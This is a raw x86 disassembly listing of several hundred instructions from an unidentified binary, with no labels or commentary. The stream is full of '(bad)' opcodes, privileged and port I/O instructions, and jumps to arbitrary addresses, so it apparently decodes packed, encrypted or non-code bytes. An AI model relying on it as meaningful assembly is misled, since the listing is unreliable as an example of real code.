  407831:	ds mov cl,0x26
  407834:	xor    al,0xce
  407836:	push   ecx
  407837:	sbb    BYTE PTR [edx-0x44],ah
  40783a:	scas   eax,DWORD PTR es:[edi]
  40783b:	ret    
  40783c:	sbb    al,0xa5
  40783e:	bound  ecx,QWORD PTR [eax-0x1a]
  407841:	mov    bl,0xe9
  407843:	push   ecx
  407844:	enter  0x986e,0x62
  407848:	cmc    
  407849:	xchg   ebp,eax
  40784a:	add    al,0x90
  40784c:	push   0x53
  40784e:	inc    edi
  40784f:	mov    ds:0x9fbae069,eax
  407854:	jge    0x4077f6
  407856:	jo     0x407807
  407858:	sti    
  407859:	add    BYTE PTR [edi-0x10613410],ch
  40785f:	ja     0x4077fb
  407861:	jb     0x40783a
  407863:	lods   eax,DWORD PTR ds:[esi]
  407864:	aam    0xcc
  407866:	jmp    FWORD PTR [ecx]
  407868:	sbb    al,0xcc
  40786a:	aad    0x8c
  40786c:	nop
  40786d:	inc    esi
  40786e:	scas   al,BYTE PTR es:[edi]
  40786f:	add    eax,0x88e2fa68
  407874:	rol    DWORD PTR [ecx],0xe4
  407877:	push   edx
  407878:	mov    cl,0x86
  40787a:	sub    DWORD PTR [ecx-0x55],0xffffff99
  40787e:	adc    ch,BYTE PTR [esi-0x3d]
  407881:	xor    BYTE PTR ds:0xcbdb8fc5,dl
  407887:	xor    BYTE PTR [eax+0x6f3a3b44],ah
  40788d:	push   edx
  40788e:	push   ebp
  40788f:	xor    BYTE PTR [si],0x98
  407893:	dec    eax
  407894:	xor    al,0xbe
  407896:	pop    ecx
  407897:	cld    
  407898:	jecxz  0x4078da
  40789a:	push   ss
  40789b:	retf   
  40789c:	dec    ebx
  40789d:	daa    
  40789e:	clc    
  40789f:	push   ebx
  4078a0:	pop    esp
  4078a1:	cmp    eax,DWORD PTR [esi]
  4078a3:	mov    al,0x5e
  4078a5:	mov    WORD PTR [ebx],ss
  4078a7:	ja     0x40782b
  4078a9:	je     0x40788e
  4078ab:	pop    ebx
  4078ac:	stc    
  4078ad:	icebp  
  4078ae:	fldcw  WORD PTR [ecx+ebp*4-0x6f]
  4078b2:	out    0xea,al
  4078b4:	into   
  4078b5:	cmp    DWORD PTR [edi-0x3],0xffffff92
  4078b9:	and    dh,BYTE PTR [edx+0x6f]
  4078bc:	jge    0x407868
  4078be:	pop    eax
  4078bf:	pop    esp
  4078c0:	and    eax,0xdd97c562
  4078c5:	int3   
  4078c6:	and    al,0xee
  4078c8:	jle    0x407944
  4078ca:	mov    WORD PTR [edi+edx*8-0x10],gs
  4078ce:	(bad)  
  4078d0:	dec    edx
  4078d1:	sub    eax,ebx
  4078d3:	mov    bh,0x60
  4078d5:	jle    0x407905
  4078d7:	jo     0x40794c
  4078d9:	ss xchg ecx,eax
  4078db:	js     0x4078f1
  4078dd:	out    dx,al
  4078de:	cmp    ah,BYTE PTR [esi-0x295c950f]
  4078e4:	das    
  4078e5:	mov    dl,0x17
  4078e7:	shl    edx,0x55
  4078ea:	pop    esi
  4078eb:	pop    ss
  4078ec:	inc    edi
  4078ed:	ins    BYTE PTR es:[edi],dx
  4078ee:	mov    cl,0x72
  4078f0:	xchg   ebp,eax
  4078f1:	dec    ecx
  4078f2:	sub    ecx,DWORD PTR [ebp-0x6692bbdd]
  4078f8:	ret    0xe171
  4078fb:	mov    eax,ss:0x5d5c6be3
  407901:	push   0xffffffb9
  407903:	and    al,0x9a
  407905:	jp     0x407902
  407907:	cld    
  407908:	sbb    BYTE PTR [ebx+0x30],0x36
  40790c:	idiv   BYTE PTR ds:0xcf20fbf0
  407912:	iret   
  407913:	fstp   QWORD PTR [ebx+0x4d88e471]
  407919:	mov    ebx,DWORD PTR [edx+0x1e2bd089]
  40791f:	mov    eax,0x98d5376d
  407924:	cmp    BYTE PTR [ebp-0x1edb49b3],0x94
  40792b:	xchg   edi,ebx
  40792d:	and    DWORD PTR [eax+esi*8+0x208197c9],0xb67ed80
  407938:	fsub   st(3),st
  40793a:	push   ebx
  40793b:	outs   dx,DWORD PTR ds:[esi]
  40793c:	add    DWORD PTR [ecx],0x2c1ba62c
  407942:	stos   BYTE PTR es:[edi],al
  407943:	and    BYTE PTR [edi],bl
  407945:	rcl    BYTE PTR [ebx+0x432d8030],1
  40794b:	(bad)  
  40794c:	inc    esp
  40794d:	xor    BYTE PTR [ecx],ch
  40794f:	adc    al,bh
  407951:	inc    edi
  407952:	in     al,0x33
  407954:	push   ds
  407955:	xor    dl,bl
  407957:	cmp    esi,DWORD PTR [esi]
  407959:	idiv   DWORD PTR [edi-0x3655418c]
  40795f:	and    BYTE PTR [ebx],bh
  407961:	lahf   
  407962:	dec    ecx
  407963:	in     eax,dx
  407964:	add    al,0x94
  407966:	mov    gs,ecx
  407968:	xor    ah,dl
  40796a:	mov    edx,0x1fdeafa1
  40796f:	pop    esi
  407970:	cmp    edx,DWORD PTR [ecx-0x28046bdf]
  407976:	in     eax,0xcf
  407978:	scas   eax,DWORD PTR es:[edi]
  407979:	imul   ecx,DWORD PTR [ecx-0x2f90f55b],0xdcc325fe
  407983:	cmp    bl,cl
  407985:	je     0x4079cf
  407987:	sub    eax,0xa35a88f7
  40798c:	pusha  
  40798d:	(bad)  
  40798e:	in     al,0xaa
  407990:	rcl    DWORD PTR [ebp-0x73],1
  407993:	loope  0x40792e
  407995:	je     0x4079ad
  407997:	sub    eax,0xef60cc9f
  40799c:	out    dx,al
  40799d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40799e:	sbb    esp,ebx
  4079a0:	mov    ds:0x8a8c04ed,al
  4079a5:	cmp    dh,BYTE PTR [eax+esi*1-0x73]
  4079a9:	fwait
  4079aa:	and    eax,0x65dc0bea
  4079af:	popf   
  4079b0:	fsub   st(3),st
  4079b2:	pop    esi
  4079b3:	xchg   esp,eax
  4079b4:	daa    
  4079b5:	mov    ecx,0x5f8295f8
  4079ba:	sbb    BYTE PTR [eax-0x36a726d],0x7f
  4079c1:	or     al,0x70
  4079c3:	cs call 0x4d788a4c
  4079c9:	outs   dx,BYTE PTR ds:[esi]
  4079ca:	popf   
  4079cb:	int    0xc7
  4079cd:	sub    al,0x3c
  4079cf:	call   0x5037:0x95143da1
  4079d6:	and    dl,BYTE PTR [ebp+edi*2-0x758bb7f7]
  4079dd:	mov    al,ds:0x716858ce
  4079e2:	xor    dh,dh
  4079e4:	fisub  DWORD PTR [edx-0x17]
  4079e7:	dec    esp
  4079e8:	jmp    0x456db07c
  4079ed:	add    ecx,DWORD PTR [ebx-0x7]
  4079f0:	push   0xffffffdd
  4079f2:	test   edi,eax
  4079f4:	lahf   
  4079f5:	xchg   esi,eax
  4079f6:	sub    DWORD PTR [ebp+0x3d3386e3],edi
  4079fc:	lods   al,BYTE PTR ds:[esi]
  4079fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079fe:	jae    0x4079fa
  407a00:	xchg   esi,eax
  407a01:	dec    BYTE PTR [ecx-0x75e92052]
  407a07:	int    0x4c
  407a09:	cli    
  407a0a:	(bad)  
  407a0b:	aaa    
  407a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a0d:	sbb    al,0xe1
  407a0f:	ja     0x407a59
  407a11:	add    esi,DWORD PTR [ebp-0x5c521b08]
  407a17:	jo     0x4079cc
  407a19:	ins    BYTE PTR es:[edi],dx
  407a1a:	pop    ebx
  407a1b:	sbb    dh,BYTE PTR [ebx]
  407a1d:	cdq    
  407a1e:	jp     0x407a4d
  407a20:	lods   al,BYTE PTR ds:[esi]
  407a21:	adc    eax,0xd9ae0db7
  407a26:	inc    ecx
  407a27:	ficom  WORD PTR [esi+0x69102032]
  407a2d:	inc    ecx
  407a2e:	nop
  407a2f:	popa   
  407a30:	jmp    0x993f14ee
  407a35:	icebp  
  407a36:	xor    esi,DWORD PTR ds:0x99c7f2db
  407a3c:	xchg   BYTE PTR [edx+0x1],ch
  407a3f:	fsubrp st(0),st
  407a41:	je     0x407aba
  407a43:	ret    0x549a
  407a46:	xor    DWORD PTR [edi],0x7f
  407a49:	xchg   edx,eax
  407a4a:	(bad)  
  407a4b:	mov    esi,0x1f88d089
  407a50:	ins    DWORD PTR es:[edi],dx
  407a51:	stos   DWORD PTR es:[edi],eax
  407a52:	cmp    DWORD PTR [eax],eax
  407a54:	fst    QWORD PTR [edx+0x31]
  407a57:	(bad)  
  407a58:	jne    0x407a16
  407a5a:	js     0x4079fd
  407a5c:	pop    esi
  407a5d:	xor    al,0x5f
  407a5f:	sub    edx,DWORD PTR [eax+0x4f]
  407a62:	rcl    bh,1
  407a64:	adc    al,0xf2
  407a66:	repz jno 0x407ace
  407a69:	fsub   st(0),st
  407a6b:	and    eax,0x4ddf8e62
  407a70:	shl    DWORD PTR [esi-0x65cb1286],cl
  407a76:	setbe  BYTE PTR [eax-0x51f3e0ae]
  407a7d:	add    bl,ch
  407a7f:	push   ebp
  407a80:	and    al,0xf
  407a82:	mov    ah,0x74
  407a84:	fdiv   DWORD PTR [edi-0x236dcbb4]
  407a8a:	cli    
  407a8b:	push   ss
  407a8c:	retf   
  407a8d:	push   es
  407a8e:	ret    0xe4
  407a91:	or     al,0xa8
  407a93:	push   ds
  407a94:	xchg   BYTE PTR [ecx-0x613ce707],al
  407a9a:	adc    DWORD PTR [eax+0x384f8df7],edx
  407aa0:	xchg   ebx,eax
  407aa1:	cmp    al,0x3d
  407aa3:	dec    esp
  407aa4:	xchg   ebp,eax
  407aa5:	add    edi,DWORD PTR [edx-0x334e7617]
  407aab:	xor    eax,0xb4014a22
  407ab0:	iret   
  407ab1:	or     BYTE PTR [edi+0x14d9cc2b],ch
  407ab7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ab8:	ja     0x407aa8
  407aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407abb:	mov    DWORD PTR [edi],ebp
  407abd:	pop    esp
  407abe:	dec    edx
  407abf:	pushf  
  407ac0:	aad    0x92
  407ac2:	and    al,0x2e
  407ac4:	cwde   
  407ac5:	sbb    ecx,ecx
  407ac7:	push   esi
  407ac8:	stos   DWORD PTR es:[edi],eax
  407ac9:	adc    BYTE PTR [esi],ah
  407acb:	pushf  
  407acc:	push   eax
  407acd:	mov    dh,0x4d
  407acf:	(bad)  [edx]
  407ad1:	(bad)  
  407ad2:	fnstenv [ecx-0x56]
  407ad5:	test   DWORD PTR [esi-0x7b],edx
  407ad8:	dec    ebx
  407ad9:	xor    ah,BYTE PTR [esi-0x530d2cba]
  407adf:	out    0x96,eax
  407ae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ae2:	fsubp  st(2),st
  407ae4:	test   al,0xac
  407ae6:	adc    al,0xf
  407ae8:	ins    BYTE PTR es:[edi],dx
  407ae9:	lea    ebx,[ecx-0x7872152d]
  407aef:	les    esp,FWORD PTR [ecx-0x52ae1188]
  407af5:	test   eax,0xe377140a
  407afa:	xchg   esi,eax
  407afb:	les    eax,FWORD PTR [edi]
  407afd:	rcr    DWORD PTR [esi],0x1f
  407b00:	dec    edx
  407b01:	enter  0xc476,0x58
  407b05:	hlt    
  407b06:	mov    esp,0xeb0bc83e
  407b0b:	frstor [ecx]
  407b0d:	lahf   
  407b0e:	(bad)  [ebx+0x22]
  407b11:	shl    BYTE PTR [edi-0x6f],1
  407b14:	fwait
  407b15:	xchg   ebx,eax
  407b16:	in     al,dx
  407b17:	sbb    ah,0x3a
  407b1a:	add    eax,DWORD PTR [edi-0x5ad27ea3]
  407b20:	sti    
  407b21:	mov    ah,0x80
  407b23:	and    ebx,eax
  407b25:	mov    ebp,0x4f129969
  407b2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b2b:	xor    ecx,DWORD PTR [ebp-0x47]
  407b2e:	sbb    al,0x96
  407b30:	jnp    0x407ae5
  407b32:	mov    al,0x32
  407b34:	dec    eax
  407b35:	repnz mov dh,ah
  407b38:	std    
  407b39:	jl     0x407b45
  407b3b:	or     BYTE PTR [esi+0x36d9f13a],ch
  407b41:	push   ds
  407b42:	lods   eax,DWORD PTR ds:[esi]
  407b43:	push   ebx
  407b44:	lods   eax,DWORD PTR ds:[esi]
  407b45:	pusha  
  407b46:	enter  0xe3b3,0x7a
  407b4a:	cmp    DWORD PTR [ebx-0x43],0xffffffbb
  407b4e:	mov    WORD PTR [ebp-0x21f60cd5],ds
  407b54:	ins    DWORD PTR es:[edi],dx
  407b55:	scas   eax,DWORD PTR es:[edi]
  407b56:	push   ds
  407b57:	xchg   ebx,eax
  407b58:	stc    
  407b59:	ja     0x407bb3
  407b5b:	iret   
  407b5c:	ins    BYTE PTR es:[edi],dx
  407b5d:	inc    esi
  407b5e:	xchg   ecx,eax
  407b5f:	(bad)  
  407b60:	lahf   
  407b61:	jmp    0x407bc4
  407b63:	xchg   esp,eax
  407b64:	test   BYTE PTR [edi],ah
  407b66:	pop    ds
  407b67:	fcomip st,st(4)
  407b69:	call   0xd06e:0x665fc9e1
  407b70:	test   BYTE PTR [ebx],bl
  407b72:	gs pop edi
  407b74:	icebp  
  407b75:	xor    ch,0x24
  407b78:	xor    ebp,DWORD PTR [edi-0x60d807d3]
  407b7e:	jmp    0x407b65
  407b80:	mov    edx,0xfa8f167c
  407b85:	clc    
  407b86:	push   esi
  407b87:	arpl   ax,ax
  407b89:	les    edi,FWORD PTR [esi-0x2053bfb2]
  407b8f:	outs   dx,DWORD PTR ds:[esi]
  407b90:	cmp    ecx,DWORD PTR [ebx-0x267167a9]
  407b96:	ret    0xc0c6
  407b99:	cmc    
  407b9a:	or     eax,0xd7a1e4a7
  407b9f:	adc    BYTE PTR [edi+0x589ba7a3],cl
  407ba5:	sbb    eax,0xff502274
  407baa:	sub    bh,0x70
  407bad:	pushf  
  407bae:	int    0xb3
  407bb0:	sub    BYTE PTR [edx+esi*2+0x7c],dl
  407bb4:	ja     0x407bc3
  407bb6:	mov    eax,ds:0xa89fa66f
  407bbb:	xor    BYTE PTR [esi],ch
  407bbd:	out    dx,al
  407bbe:	(bad)  
  407bbf:	jle    0x407c24
  407bc1:	nop
  407bc2:	jne    0x407bbe
  407bc4:	mov    ebp,0x5638e66a
  407bc9:	push   es
  407bca:	(bad)  
  407bcb:	or     bx,WORD PTR [eax+0x74]
  407bcf:	sbb    BYTE PTR [esi],ch
  407bd1:	into   
  407bd2:	rcl    BYTE PTR [edx-0x1d6dd8eb],1
  407bd8:	fsub   DWORD PTR [edi+ebp*1]
  407bdb:	ins    BYTE PTR es:[edi],dx
  407bdc:	aaa    
  407bdd:	ss mov edi,ebp
  407be0:	ins    BYTE PTR es:[edi],dx
  407be1:	mov    edi,0xba8680ed
  407be6:	in     eax,dx
  407be7:	mov    BYTE PTR [edi+edx*2],0x21
  407beb:	jae    0x407c41
  407bed:	lds    edi,FWORD PTR cs:[ebx+0x1a64b47a]
  407bf4:	sbb    al,0x1b
  407bf6:	inc    esp
  407bf7:	nop
  407bf8:	ret    0x4942
  407bfb:	fadd   st(3),st
  407bfd:	push   0xf4841602
  407c02:	sub    cl,BYTE PTR [edx]
  407c04:	mov    eax,ds:0xeb11f48f
  407c09:	popf   
  407c0a:	jbe    0x407c68
  407c0c:	popa   
  407c0d:	loope  0x407c09
  407c0f:	fcmovu st,st(3)
  407c11:	imul   edi,DWORD PTR [ecx+ebx*4],0x485746d1
  407c18:	jl     0x407c84
  407c1a:	jbe    0x407c58
  407c1c:	pusha  
  407c1d:	aad    0xc2
  407c1f:	inc    ebx
  407c20:	jmp    0x727a:0x61241dc5
  407c27:	fwait
  407c28:	ret    0x91a3
  407c2b:	push   es
  407c2c:	dec    ebp
  407c2d:	jno    0x407c24
  407c2f:	fwait
  407c30:	leave  
  407c31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c32:	add    DWORD PTR [ebp-0x7d],esi
  407c35:	mov    ah,0xd1
  407c37:	cs mov bh,0xda
  407c3a:	add    eax,0xed8b3e25
  407c3f:	pop    es
  407c40:	cli    
  407c41:	adc    al,0xa5
  407c43:	or     dl,0x44
  407c46:	or     cl,dh
  407c48:	pop    edi
  407c49:	fmul   QWORD PTR [eax]
  407c4b:	fld    TBYTE PTR [ebp-0x50]
  407c4e:	popa   
  407c4f:	pop    ebp
  407c50:	inc    eax
  407c51:	ss dec ebx
  407c53:	lock pop es
  407c55:	loopne 0x407c7a
  407c57:	nop
  407c58:	jbe    0x407c2c
  407c5a:	sub    esi,DWORD PTR [ecx]
  407c5c:	lods   eax,DWORD PTR ds:[esi]
  407c5d:	pop    ebp
  407c5e:	adc    eax,DWORD PTR [edi+0x79]
  407c61:	inc    ebp
  407c62:	pop    esp
  407c63:	cmp    eax,0xf59b12cc
  407c68:	test   DWORD PTR [eax+0x5196e23c],0xf6513fdc
  407c72:	inc    eax
  407c73:	mov    ds:0x49dc50c2,al
  407c78:	in     al,0x5e
  407c7a:	inc    edx
  407c7b:	addr16 pop ds
  407c7d:	xchg   ecx,eax
  407c7e:	loop   0x407c16
  407c80:	cli    
  407c81:	jp     0x407c52
  407c83:	mov    bl,0xbb
  407c85:	add    DWORD PTR [ecx],edi
  407c87:	popf   
  407c88:	ret    
  407c89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c8a:	inc    eax
  407c8b:	xchg   ecx,eax
  407c8c:	cld    
  407c8d:	jno    0x407cb7
  407c8f:	dec    ecx
  407c90:	fldenv [ecx]
  407c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c93:	in     al,dx
  407c94:	xchg   dl,cl
  407c96:	imul   ecx,DWORD PTR [eax],0x51
  407c99:	lods   eax,DWORD PTR ds:[esi]
  407c9a:	or     eax,0x9fe4dc76
  407c9f:	jne    0x407c54
  407ca1:	cli    
  407ca2:	call   0x709:0x516c191
  407ca9:	pushw  cs
  407cab:	jmp    0xec1e2776
  407cb0:	push   ebx
  407cb1:	sbb    al,0x8e
  407cb3:	outs   dx,BYTE PTR ds:[esi]
  407cb4:	mov    ecx,0x337c93c6
  407cb9:	cmp    al,0xb7
  407cbb:	pop    edi
  407cbc:	fisttp DWORD PTR [edx-0x3a]
  407cbf:	push   es
  407cc0:	repz dec edi
  407cc2:	stos   DWORD PTR es:[edi],eax
  407cc3:	out    dx,eax
  407cc4:	outs   dx,BYTE PTR ds:[esi]
  407cc5:	sti    
  407cc6:	inc    eax
  407cc7:	cwde   
  407cc8:	jno    0x407cd3
  407cca:	iret   
  407ccb:	int3   
  407ccc:	lds    eax,FWORD PTR [esi+0x18189741]
  407cd2:	sti    
  407cd3:	fnstsw WORD PTR [ecx+0x445eccde]
  407cd9:	or     ebp,edx
  407cdb:	adc    BYTE PTR [edi],ch
  407cdd:	dec    ecx
  407cde:	sti    
  407cdf:	in     eax,0xf7
  407ce1:	es pop edi
  407ce3:	(bad)  
  407ce4:	jle    0x407d38
  407ce6:	lds    ebx,FWORD PTR gs:[ecx+ebx*8-0x73928da3]
  407cee:	xchg   ebp,eax
  407cef:	lods   eax,DWORD PTR ds:[esi]
  407cf0:	mov    ecx,0xb4fd7536
  407cf5:	push   ebp
  407cf6:	mov    edi,DWORD PTR [edi-0x5c98799c]
  407cfc:	sub    ebp,0xffffffc8
  407cff:	inc    esp
  407d00:	out    dx,al
  407d01:	pop    es
  407d02:	in     eax,0x30
  407d04:	inc    esi
  407d05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d06:	or     esi,DWORD PTR [eax-0x73]
  407d09:	test   ch,al
  407d0b:	inc    eax
  407d0c:	mov    cs,WORD PTR [edi+0x5ee6216]
  407d12:	scas   eax,DWORD PTR es:[edi]
  407d13:	scas   eax,DWORD PTR es:[edi]
  407d14:	xchg   DWORD PTR [esi-0x7f614d39],edi
  407d1a:	jno    0x407c9e
  407d1c:	lods   al,BYTE PTR ds:[esi]
  407d1d:	mov    dh,0x32
  407d1f:	jns    0x407d20
  407d21:	loopne 0x407d35
  407d23:	cwde   
  407d24:	hlt    
  407d25:	aad    0xe5
  407d27:	popa   
  407d28:	mov    edi,0xf68b2d00
  407d2d:	or     DWORD PTR [ebp-0x40],ebx
  407d30:	aad    0xf2
  407d32:	fidivr WORD PTR [eax-0x3ba0236f]
  407d38:	pop    esp
  407d39:	hlt    
  407d3a:	adc    dh,BYTE PTR [edi+0x6c]
  407d3d:	and    eax,0xc31d81e5
  407d42:	fwait
  407d43:	dec    edx
  407d44:	jne    0x407d18
  407d46:	and    ebx,DWORD PTR [ecx-0x57]
  407d49:	mov    edx,0xbdd44d99
  407d4e:	or     dh,bh
  407d50:	aaa    
  407d51:	push   esi
  407d52:	aaa    
  407d53:	ja     0x407d95
  407d55:	(bad)  
  407d56:	scas   al,BYTE PTR es:[edi]
  407d57:	test   al,0xff
  407d59:	add    al,0x85
  407d5b:	mov    ds:0x8b24d865,eax
  407d60:	cwde   
  407d61:	mov    WORD PTR [edi+0x7c],cs
  407d64:	and    DWORD PTR [ecx+ebx*1-0x15f382b5],esi
  407d6b:	pop    esi
  407d6c:	and    al,0x63
  407d6e:	mov    BYTE PTR [edx],bh
  407d70:	mov    bl,0xce
  407d72:	jbe    0x407d39
  407d74:	push   0x30319cc7
  407d79:	jmp    0x9748b68b
  407d7e:	(bad)  
  407d7f:	js     0x407db2
  407d81:	fs stc 
  407d83:	and    bl,BYTE PTR [edx]
  407d85:	mov    ds:0x165a6e9f,eax
  407d8a:	or     BYTE PTR [ebx+0x32959b71],ah
  407d90:	(bad)  
  407d91:	ss cmc 
  407d93:	cdq    
  407d94:	xor    esi,DWORD PTR [ebx+eiz*2]
  407d97:	fmul   QWORD PTR [esi-0x26d40a1d]
  407d9d:	fiadd  WORD PTR [eax-0x36]
  407da0:	fistp  DWORD PTR [edi+0x4e]
  407da3:	jns    0x407d52
  407da5:	or     DWORD PTR [eax-0x4b1ee5da],ebx
  407dab:	lods   al,BYTE PTR ds:[esi]
  407dac:	in     eax,0xe8
  407dae:	adc    eax,0xab880cd9
  407db3:	scas   al,BYTE PTR es:[edi]
  407db4:	dec    DWORD PTR [ebp-0xfd91388]
  407dba:	or     BYTE PTR [ebx-0x9],dl
  407dbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dbe:	and    eax,0x5f5b7b51
  407dc3:	inc    ecx
  407dc4:	jg     0x407d81
  407dc6:	aas    
  407dc7:	push   edi
  407dc8:	pop    es
  407dc9:	xchg   DWORD PTR gs:[ebx],esi
  407dcc:	mov    fs:0xfc5c27ad,eax
  407dd2:	or     ah,bh
  407dd4:	dec    eax
  407dd5:	out    dx,eax
  407dd6:	jbe    0x407d5d
  407dd8:	cs mov dl,0x42
  407ddb:	pop    edi
  407ddc:	bound  esp,QWORD PTR [edx]
  407dde:	jne    0x407e42
  407de0:	shl    DWORD PTR [esi],cl
  407de2:	jne    0x407e50
  407de4:	inc    edi
  407de5:	jge    0x407e1f
  407de7:	jae    0x407de3
  407de9:	sar    DWORD PTR [edx],1
  407deb:	neg    BYTE PTR [ebx+0x81f9eb8]
  407df1:	pop    ds
  407df2:	or     BYTE PTR [esi-0x2a1b94a6],bh
  407df8:	fild   QWORD PTR [ebp-0x48]
  407dfb:	lea    esp,[eax]
  407dfd:	fisttp QWORD PTR [edx]
  407dff:	dec    edx
  407e00:	jmp    DWORD PTR [eax+0x1e4dfbc3]
  407e06:	test   al,0x50
  407e08:	out    0xd7,eax
  407e0a:	adc    al,0xd1
  407e0c:	mov    edi,0xa3f4ad0d
  407e11:	pushf  
  407e12:	cmp    al,0x51
  407e14:	sub    BYTE PTR [ecx],bl
  407e16:	aam    0x72
  407e18:	in     eax,0xee
  407e1a:	aad    0x38
  407e1c:	js     0x407e3f
  407e1e:	les    esp,FWORD PTR [ebp+ebp*8-0x5a44bd1]
  407e25:	ins    DWORD PTR es:[edi],dx
  407e26:	imul   edi,DWORD PTR [esi-0x8981621],0x3b8a73c4
  407e30:	dec    edi
  407e31:	loop   0x407e53
  407e33:	push   ds
  407e34:	iret   
  407e35:	push   edx
  407e36:	jne    0x407e70
  407e38:	sub    al,0x3e
  407e3a:	std    
  407e3b:	push   eax
  407e3c:	xchg   ebx,eax
  407e3d:	xchg   ecx,eax
  407e3e:	lods   al,BYTE PTR ds:[esi]
  407e3f:	sub    dl,BYTE PTR ds:[edi+0x78a26049]
  407e46:	mov    bl,0x5f
  407e48:	pop    ebp
  407e49:	(bad)  
  407e4a:	int3   
  407e4b:	pusha  
  407e4c:	out    dx,eax
  407e4d:	(bad)  
  407e4e:	mov    ebp,0x32a00628
  407e53:	sbb    ebx,DWORD PTR [ebp-0x21]
  407e56:	je     0x407ea2
  407e58:	fxch   st(7)
  407e5a:	loop   0x407e0f
  407e5c:	pop    edi
  407e5d:	mov    WORD PTR [esi],gs
  407e5f:	mov    ebp,0x64ccb2b
  407e64:	inc    ecx
  407e65:	push   ss
  407e66:	xor    BYTE PTR [ecx+0x3a],0x3d
  407e6a:	and    BYTE PTR [ebx+0x47],0x71
  407e6e:	stos   DWORD PTR es:[edi],eax
  407e6f:	test   dh,al
  407e71:	xor    al,0x60
  407e73:	jmp    0x70f3:0xf56a7988
  407e7a:	les    ebp,FWORD PTR [eax]
  407e7c:	aas    
  407e7d:	cmp    dh,BYTE PTR [ebx+0x33f4b7f]
  407e83:	in     eax,dx
  407e84:	or     edi,esi
  407e86:	ss addr16 mov ebx,0x9dbddf2a
  407e8d:	inc    eax
  407e8e:	mov    eax,ds:0x73024dc4
  407e93:	sub    cl,bh
  407e95:	dec    edi
  407e96:	aas    
  407e97:	mov    BYTE PTR ds:0xb7846df3,0x35
  407e9e:	pop    esi
  407e9f:	js     0x407f1b
  407ea1:	jno    0x407ee4
  407ea3:	or     DWORD PTR ds:0xb82a6cc8,edx
  407ea9:	es xchg edi,eax
  407eab:	fistp  QWORD PTR [edi]
  407ead:	pop    edx
  407eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eaf:	pushf  
  407eb0:	add    BYTE PTR [edi],0x8b
  407eb3:	xchg   DWORD PTR ds:0x1b9194fb,edx
  407eb9:	dec    eax
  407eba:	and    al,0x12
  407ebc:	xor    al,BYTE PTR [edi+edx*8]
  407ebf:	lea    esi,[esi]
  407ec1:	add    eax,DWORD PTR [edx-0x4c]
  407ec4:	mov    ebx,0x22d93148
  407ec9:	dec    ebp
  407eca:	jl     0x407f3a
  407ecc:	push   edx
  407ecd:	add    BYTE PTR [ebp+0x4e],0xf3
  407ed1:	neg    ebx
  407ed3:	stc    
  407ed4:	gs xchg esp,eax
  407ed6:	or     al,0xf9
  407ed8:	push   edi
  407ed9:	out    0x20,eax
  407edb:	lds    edi,FWORD PTR [ebx+ecx*8-0x1fa8e976]
  407ee2:	or     esi,DWORD PTR [ebp+eiz*8-0x68406eb1]
  407ee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407eea:	test   eax,edx
  407eec:	mov    ds:0x915988c3,eax
  407ef1:	rcl    bh,1
  407ef3:	aas    
  407ef4:	ss jns 0x407eaa
  407ef7:	retf   
  407ef8:	xor    BYTE PTR [edx+0x19854749],0x8a
  407eff:	sub    BYTE PTR [eax],0x94
  407f02:	sub    ah,BYTE PTR [eax+ebp*8+0x13]
  407f06:	add    eax,0x7737cbc9
  407f0b:	test   BYTE PTR [ecx-0x288cbd7d],ch
  407f11:	xchg   ebp,ecx
  407f13:	jmp    0xaa032bde
  407f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f19:	mov    dh,0xcf
  407f1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f1c:	mov    eax,0x55e8db47
  407f21:	stos   DWORD PTR es:[edi],eax
  407f22:	fadd   DWORD PTR [esi]
  407f24:	add    eax,0xa4110bf0
  407f29:	or     eax,0xd886260f
  407f2e:	cmp    BYTE PTR [ebp+0x66fb4ed5],ch
  407f34:	sub    BYTE PTR [ebp-0x6e70c898],dh
  407f3a:	int    0x78
  407f3c:	add    al,0x2b
  407f3e:	adc    al,0xae
  407f40:	mov    al,ds:0x2bf480c9
  407f45:	push   cs
  407f46:	or     DWORD PTR [edi-0x23de3a1b],edi
  407f4c:	pop    es
  407f4d:	inc    ebp
  407f4e:	outs   dx,BYTE PTR ds:[esi]
  407f4f:	jle    0x407fa1
  407f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f52:	(bad)  
  407f53:	xor    esi,DWORD PTR ds:0x3a97dc69
  407f59:	xchg   ecx,eax
  407f5a:	(bad)  
  407f5b:	(bad)  
  407f5c:	out    0xc2,al
  407f5e:	into   
  407f5f:	mov    ecx,0x64326633
  407f64:	adc    al,0x97
  407f66:	sub    bh,BYTE PTR [esi+0x53]
  407f69:	int3   
  407f6a:	dec    ebp
  407f6b:	add    al,0x67
  407f6d:	(bad)  
  407f6e:	data16 (bad) 
  407f71:	(bad)  
  407f72:	adc    al,0x58
  407f74:	cmp    ebp,ebx
  407f76:	xchg   BYTE PTR [esi-0x53e15f60],bh
  407f7c:	xchg   ebp,eax
  407f7d:	mov    ecx,0x79ab2f69
  407f82:	mov    esi,0xa939be1e
  407f87:	mov    eax,0x6d0b340a
  407f8c:	data16 shl BYTE PTR [edx],cl
  407f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f90:	push   esp
  407f91:	mov    bl,0x80
  407f93:	pop    ss
  407f94:	xlat   BYTE PTR ds:[ebx]
  407f95:	aaa    
  407f96:	mov    ebx,DWORD PTR [edi]
  407f98:	add    eax,0xa2060d38
  407f9d:	and    eax,0xbbaddc9
  407fa2:	fdivr  QWORD PTR [eax+0x75]
  407fa5:	jmp    0x407f67
  407fa7:	jl     0x407ffa
  407fa9:	icebp  
